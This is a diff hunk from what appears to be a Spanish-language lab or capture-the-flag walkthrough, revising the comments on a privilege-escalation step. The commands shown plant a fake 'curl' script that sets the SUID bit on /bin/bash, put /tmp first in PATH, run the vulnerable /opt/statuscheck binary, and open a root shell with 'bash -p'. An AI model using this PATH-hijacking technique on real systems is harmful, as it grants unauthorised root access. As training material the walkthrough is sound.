@@ -217,11 +217,11 @@ vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta hac
 ```python
 > echo "chmod u+s /bin/bash" > curl (creamos un archivo llamado curl el cual comtiene comandos para cambiar los permisos de la bash)
 
-> chmod +x curl (otorgamos permisos al archivo )
+> chmod +x curl (otorgamos permisos al archivo curl que hemos creado)
 
-> export PATH=/tmp:$PATH
+> export PATH=/tmp:$PATH (exportamos el directorio donde esta nuestro archivo al PATH)
 
-> /opt/statuscheck
+> /opt/statuscheck ()
 
 > bash -p
 
